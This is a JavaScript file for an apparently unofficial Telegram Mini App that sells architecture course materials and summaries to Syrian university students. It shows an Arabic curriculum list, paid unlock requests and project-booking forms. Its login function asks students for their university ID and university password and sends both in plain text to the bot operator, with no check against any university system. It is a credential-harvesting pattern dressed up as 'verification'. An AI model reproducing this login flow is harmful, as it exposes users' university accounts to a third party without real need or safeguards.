const tg = window.Telegram.WebApp;
tg.expand();

try {
    if (tg.version && parseFloat(tg.version) >= 6.0) {
        tg.disableClosingConfirmation();
    }
    if (tg.executeCommand) {
        tg.executeCommand('disable_snapshots');
    }
} catch(e) {}

const userTelegramId = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user.id : "123456789";

function generateWatermark() {
    const layer = document.getElementById('wmLayer');
    layer.innerHTML = '';
    for(let i=0; i<40; i++) {
        const span = document.createElement('span');
        span.innerText = userTelegramId;
        layer.appendChild(span);
    }
}
generateWatermark();

function submitLoginData() {
    const uniId = document.getElementById('login-uni-id').value.trim();
    const pwd = document.getElementById('login-pwd').value.trim();
    
    if(!uniId || !pwd) {
        alert("الرجاء إدخال رقمك الجامعي وكلمة المرور لإتمام الفحص والمطابقة!");
        return;
    }
    
    tg.sendData(`login_${uniId}_${pwd}`);
    
    document.getElementById('scr-login').classList.remove('active');
    document.getElementById('scr-courses').classList.add('active');
    document.getElementById('appTabBar').style.display = "flex";
    document.getElementById('appTitle').innerText = "📚 الدورات";
}

const currentTheme = tg.colorScheme === 'light' ? 'light' : 'dark';
if(currentTheme === 'light') {
    document.body.className = 'theme-light';
}

function toggleTheme() {
    if(document.body.className === 'theme-dark') {
        document.body.className = 'theme-light';
    } else if(document.body.className === 'theme-light') {
        document.body.className = 'theme-pink';
    } else {
        document.body.className = 'theme-dark';
    }
}

function calculateTermProgress() {
    const startDate = new Date('2026-10-03');
    const endDate = new Date('2027-02-06');
    const today = new Date();
    
    if (today < startDate) {
        document.getElementById('pBar').style.width = '0%';
        document.getElementById('pDaysText').innerText = 'لم يبدأ الفصل الدراسي بعد';
        return;
    }
    if (today > endDate) {
        document.getElementById('pBar').style.width = '100%';
        document.getElementById('pDaysText').innerText = 'انتهى الفصل الدراسي الحالي';
        return;
    }
    
    const totalDuration = endDate - startDate;
    const currentPassed = today - startDate;
    const percentage = Math.floor((currentPassed / totalDuration) * 100);
    
    const diffTime = Math.abs(endDate - today);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    document.getElementById('pBar').style.width = percentage + '%';
    document.getElementById('pDaysText').innerText = `متبقي ${diffDays} يوم على نهاية الفصل الحالي`;
}
calculateTermProgress();
const curriculum = [
    {
        year: "السنة الأولى",
        sem1: ["ثقافة عربية", "اللغة الإنكليزية (2)", "العمارة السورية", "مبادئ التصميم المعماري", "رسم حر ونماذج (2)", "أسس تقانة المعلومات"],
        sem2: ["اللغة العربية", "اللغة الإنكليزية (1)", "تاريخ عمارة الحضارات القديمة", "مبادئ رسم هندسي", "رسم حر ونماذج (1)", "رياضيات وميكانيك التوازن", "نظريات الإنشاء"]
    },
    {
        year: "السنة الثانية",
        sem1: ["أسس تنفيذ المباني", "تاريخ عمارة العصور الوسطى", "التصميم المعماري (1)", "الظل والمنظور (1)", "الرسم بمعونة الحاسب (1)", "حسابات الإنشاءات"],
        sem2: ["مقاومة المواد", "فيزياء البناء", "تاريخ العمارة الإسلامية", "التصميم المعماري (2)", "الظل والمنظور (2)", "إكساء المباني", "الرسم بمعونة الحاسب (2)"]
    },
    {
        year: "السنة الثالثة",
        sem1: ["مواد البناء", "نظريات التكوين المعماري", "التصميم المعماري (3)", "مدخل إلى التصميمات التنفيذية", "تجهيزات المباني (1)"],
        sem2: ["نظريات تخطيط المدن", "نظريات العمارة المعاصرة", "التصميم المعماري (4)", "التصميمات التنفيذية للمباني", "تجهيزات المباني (2)", "المساحة"]
    },
    {
        year: "السنة الرابعة",
        sem1: ["بيتون مسلح", "تخطيط التجمعات السكنية", "أسس وتصميم الأبنية السكنية", "التصميم المعماري (5)", "التصميمات التنفيذية للمباني والمواقع العامة", "تجميل المدن"],
        sem2: ["تنسيق مواقع", "تخطيط التجمعات العمرانية", "علوم البيئة", "التصميم المعماري (6)", "التصميمات التنفيذية للمنشآت المعدنية", "النقد المعماري", "العمارة الداخلية (1)", "علم الاجتماع العمراني"]
    },
    {
        year: "السنة الخامسة",
        sem1: ["تخطيط التنظيم العمراني", "برنامج مشروع التخرج.. التصميم المعماري (7)", "إحياء المباني والمواقع الأثرية", "تنظيم مشروعات"],
        sem2: ["تشريع عقاري", "مشروع التخرج", "التدريب والتأهيل", "نظم المعلومات الجغرافية GIS"]
    }
];
function renderStructure() {
    const coursesWrapper = document.getElementById('courses-container');
    const materialsWrapper = document.getElementById('materials-container');
    
    coursesWrapper.innerHTML = '';
    materialsWrapper.innerHTML = '';
    
    curriculum.forEach((block, bIdx) => {
        let htmlBlock = `
            <div class="year-section">
                <div class="year-title">🎒 ${block.year}</div>
                <div class="semester-container">
                    <div class="semester-col">
                        <div class="semester-name">الفصل الأول</div>
        `;
        
        block.sem1.forEach((mat) => {
            let isFirstFree = (bIdx === 0 && mat === "ثقافة عربية");
            if(isFirstFree) {
                htmlBlock += `<div class="material-card unlocked" onclick="viewSecurePdf('${mat}')"><span>${mat}</span><span style="font-size:0.7rem; background:var(--success); color:white; padding:2px 6px; border-radius:4px;">🔓 مجاني</span></div>`;
            } else {
                htmlBlock += `<div class="material-card" onclick="openPaymentModal('${mat}')"><span>${mat}</span><span>🔒</span></div>`;
            }
        });
        
        htmlBlock += `
                    </div>
                    <div class="semester-col">
                        <div class="semester-name">الفصل الثاني</div>
        `;
        
        block.sem2.forEach((mat) => {
            htmlBlock += `<div class="material-card" onclick="openPaymentModal('${mat}')"><span>${mat}</span><span>🔒</span></div>`;
        });
        
        htmlBlock += `
                    </div>
                </div>
            </div>
        `;
        
        coursesWrapper.innerHTML += htmlBlock;
    });

    curriculum.forEach((block) => {
        let htmlBlock = `
            <div class="year-section">
                <div class="year-title">📖 الكتب والملخصات - ${block.year}</div>
                <div class="semester-container">
                    <div class="semester-col">
                        <div class="semester-name">الفصل الأول</div>
        `;
        block.sem1.forEach((mat) => {
            htmlBlock += `<div class="material-card" onclick="openPaymentModal('كتاب/ملخص: ${mat}')"><span>${mat}</span><span>🔒</span></div>`;
        });
        htmlBlock += `</div><div class="semester-col"><div class="semester-name">الفصل الثاني</div>`;
        block.sem2.forEach((mat) => {
            htmlBlock += `<div class="material-card" onclick="openPaymentModal('كتاب/ملخص: ${mat}')"><span>${mat}</span><span>🔒</span></div>`;
        });
        htmlBlock += `</div></div></div>`;
        materialsWrapper.innerHTML += htmlBlock;
    });
}
renderStructure();

function switchTab(screenId, headerTitle) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    
    document.getElementById(`scr-${screenId}`).classList.add('active');
    document.getElementById(`btn-${screenId}`).classList.add('active');
    document.getElementById('appTitle').innerText = headerTitle;
}

let selectedMaterialForPayment = "";
function openPaymentModal(materialName) {
    selectedMaterialForPayment = materialName;
    document.getElementById('modalMatName').innerText = materialName;
    document.getElementById('receiptInput').value = "";
    document.getElementById('payModal').style.display = "flex";
}

function closePaymentModal() {
    document.getElementById('payModal').style.display = "none";
}

function confirmPaymentRequest() {
    const recVal = document.getElementById('receiptInput').value.trim();
    if(!recVal) {
        alert("الرجاء إدخال رقم العملية المرجعي للمطابقة!");
        return;
    }
    tg.sendData(`pay_${selectedMaterialForPayment}_${recVal}`);
    closePaymentModal();
    alert("تم إرسال طلب التفعيل المالي إلى الإدارة. يرجى الانتظار.");
}

function viewSecurePdf(filename) {
    document.getElementById('pdfViewTitle').innerText = filename;
    document.getElementById('pdfMetaName').innerText = filename + ".pdf";
    document.getElementById('pdfViewLayer').style.display = "flex";
}

function closePdfViewer() {
    document.getElementById('pdfViewLayer').style.display = "none";
}

function submitProject() {
    const year = document.getElementById('p-year').value;
    const name = document.getElementById('p-name').value;
    const deadline = document.getElementById('p-deadline').value;
    const details = document.getElementById('p-details').value;
    
    if(!year || !name || !deadline) {
        alert("الرجاء ملء الخانات الأساسية للمشروع المعماري!");
        return;
    }
    tg.sendData(`project_${year}_${name}_${deadline}_${details}`);
    alert("تم إرسال طلب تدوين خطة المشروع بنجاح للأدمن.");
}

function submitResearch() {
    const mat = document.getElementById('r-material').value;
    const title = document.getElementById('r-title').value;
    const conds = document.getElementById('r-conditions').value;
    
    if(!mat || !title) {
        alert("الرجاء كتابة اسم المادة وعنوان البحث!");
        return;
    }
    tg.sendData(`research_${mat}_${title}_${conds}`);
    alert("تم إرسال طلب حجز حلقة البحث بنجاح.");
}

function downloadCalculatorFile() {
    tg.sendData("download_gpa_excel");
    alert("تم إشعار البوت بإرسال ملف calculator.zip الجاهز لك في المحادثة.");
}

function openExternalGpaSite() {
    tg.openLink("https://google.com");
}
